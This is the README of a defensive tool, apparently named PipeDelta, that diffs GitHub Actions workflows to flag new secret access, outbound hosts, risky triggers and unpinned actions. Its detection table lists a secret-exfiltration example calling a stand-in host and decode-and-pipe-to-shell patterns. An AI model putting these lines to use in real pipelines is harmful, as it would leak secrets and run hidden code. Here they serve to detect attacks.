# PipeDelta

**A pull request just changed your CI pipeline. What can that pipeline do now that it
could not do before?**

PipeDelta answers that question for GitHub Actions. It compares the workflow files
(and the actions stored in the repository) before and after a change, and reports
in plain sentences the **new powers** the pipeline gained: secrets it can now read,
addresses it now contacts, permissions, triggers, outside code, hidden commands. Each
finding comes with a concrete fix. High-level gains fail the check, so a risky
change cannot slip through a hurried review.

```
PipeDelta: this change gives the pipeline 5 new power(s). Highest level: high.

.github/workflows/ci.yml
  [HIGH  ] In job 'test', a command now contacts collector.example.invalid.
           The same job can read secrets, so they could be sent there.
  [HIGH  ] Now runs on 'pull_request_target', which people outside the project
           can set off while the pipeline still has access to secrets.
           fix: Use 'pull_request' if the workflow only needs to test the change...
  [HIGH  ] In job 'test', now runs outside code some-stranger/format-helper@v1,
           and its author can change what that version does at any time.
           fix: Lock it to one commit: `uses: some-stranger/format-helper@<commit id>  # v1`
  ...
```

On a pull request the same report appears as a single comment that updates itself on
every push. A live example is pull request #2 in this repository.

## Why this exists

The GitHub Actions attacks of 2025 and 2026 (GhostAction, the tj-actions and
trivy-action tag hijacks, "pwn request" campaigns) often began with a small,
plausible change to a workflow file: a new step that reads a secret and posts it
somewhere. A reviewer sees ten lines of YAML. PipeDelta turns those ten lines into
sentences about what changed.

## How it differs from zizmor and poutine

[zizmor](https://github.com/zizmorcore/zizmor) and
[poutine](https://github.com/boostsecurityio/poutine) are established scanners. They
find **known weak patterns** in a workflow as it stands. PipeDelta asks a different
question: **what did this change add?** That matters for secret theft, where every
line looks normal on its own and only the combination (a secret plus a new address,
in the same job) is the attack.

The three tools were run on the same 12 attack cases, each judged only on problems
that are **new** in the change (`docs/EVALUATION.md`, Test 3):

| | PipeDelta 0.4 | zizmor 1.32 | poutine 1.1.6 | PipeDelta + zizmor |
|---|---|---|---|---|
| Attack cases caught | 9 of 12 | 5 of 12 | 2 of 12 | 10 of 12 |

Be careful with this table: the cases were written by PipeDelta's author, and
PipeDelta was later tuned to them. It shows *what kind* of change each tool notices,
not that one tool is better. zizmor catches a case PipeDelta's own rules miss (a token
leaked through an uploaded artifact), so PipeDelta can run zizmor as a second
opinion (`--zizmor on`): it keeps only zizmor's **new** results, explains them in the
same plain language, and notes where both tools agree.

## Use it in a repository

```yaml
# .github/workflows/pipedelta.yml
on:
  pull_request:          # not pull_request_target: strangers get no secrets
    paths: [".github/**", ".pipedelta.yml", "**/action.yml", "**/action.yaml"]
permissions:
  contents: read
jobs:
  review:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false
      - uses: Vachana7/pipedelta@<commit id of the release you use> # v0.4.0
        with:
          token: ${{ github.token }}
          fail-on: high          # low, medium, high or never (comment only)
          zizmor: "off"          # "on" adds zizmor's new findings
```

Lock PipeDelta itself to a commit, as above. PipeDelta flags unlocked actions as
high, and it should be held to its own rule. Then mark the PipeDelta check as
**required** in the branch rules: if a pull request removes the PipeDelta step, the
report says so (high), but only a required check makes that a real block.

### Trust list

Projects that already rely on some outside actions or upload addresses can list
them in `.pipedelta.yml` (example: `examples/pipedelta.yml`):

```yaml
trusted-actions: [docker/*, pypa/gh-action-pypi-publish]
trusted-hosts: [pypi.org, codecov.io]
```

Findings about trusted entries become low-level notes. The list is read from the
**target branch**, never from the pull request, so a pull request cannot trust its
own additions; widening the list is itself reported.

## Try it locally

```sh
pip install -e .
python -m pipedelta diff examples/before.yml examples/after-attack.yml
python -m pipedelta diff - examples/sneaky-action.yml          # a new repository action
python -m pipedelta git <base-commit> <head-commit>
python -m pipedelta diff OLD NEW --format json                  # or markdown
pip install zizmor && python -m pipedelta diff examples/before.yml examples/after-artifact.yml --zizmor on
```

The command exits with 1 when a change adds a power at or above `--fail-on`
(default high). `--resolve-pins` (with `GITHUB_TOKEN` set) fills in the real commit
ids in pin suggestions; the GitHub Action does this automatically when given a token.

Offline demo with Docker only: `docker compose run --rm safe | attack | fixed | sneaky | artifact`,
and `docker compose up dashboard` for the results page at http://localhost:8080.

## What it looks for

| Power | Example | Level |
|---|---|---|
| Risky trigger | `pull_request_target`, `workflow_run`, `issue_comment` | high |
| Token write access | `contents: write`, `write-all` | high |
| Outside code by a movable version | `uses: someone/tool@v1` | high |
| Outside text pasted into a command | `${{ github.event.issue.title }}` in `run:` or `github-script` | high |
| Hidden command | `base64 -d \| bash`, `xxd -r \| sh`, `exec(b64decode(...))` | high |
| Secret plus a new address in one job | `curl -d "$TOKEN" evil.example` | high |
| PipeDelta step removed | the check switches itself off | high |
| New secret, new address, address only known at run time | `secrets.X`, `secrets['X']`, `curl "$URL"` | medium |
| No token limit, self-hosted machine, outside container image | | medium |
| Version bumps, renamed jobs, GitHub's own actions | | low |

A change that only moves something around (renames a file or job, bumps a version
of an action already in use, narrows a permission) is not counted as a new power.
Workflows and composite actions stored in the repository (`uses: ./...`) are both
read, so an attack moved into `.github/actions/*/action.yml` is still seen.

## Evaluation in one paragraph

On 12 attack cases reconstructed from public reports, the first version (written
before any testing) blocked 6 of the 10 cases that change a workflow file; version
0.4 blocks 9, but that number is not independent because the rules were adjusted to
the misses. On 1,659 real past workflow commits from eight Python projects, version
0.4 would have blocked about 1 in 11, mostly outside actions not locked to a commit.
zizmor alone would have raised a new High result on about 1 in 3 of those commits.
Full method, numbers and what has not been tested: `docs/EVALUATION.md`. Results
page: `dashboard/index.html`.

## Known limits

- It does not look inside **outside** actions or inside scripts a step runs
  (`run: ./build.sh`). A change to such a script is not a workflow change.
- An address built from variables is reported as "only known at run time", not by
  name; an address hidden in a script file is not seen.
- Attacks that change no file in the repository (a hijacked version tag, case 08)
  cannot be seen by any tool of this kind. PipeDelta flags the earlier change that
  made them possible (using a movable tag).
- The levels are hand-written rules. About one workflow change in eleven is blocked
  on busy projects; teams that do not lock actions to commits may prefer
  `fail-on: never` (comment only) or a trust list.

## Documents

- `docs/DEMO.md`: expo demo script and likely examiner questions
- `docs/EVALUATION.md`: what was measured and what was not
- `docs/UX.md`: personas, user journey, wireframes
- `docs/LEARN.md`: study notes with questions
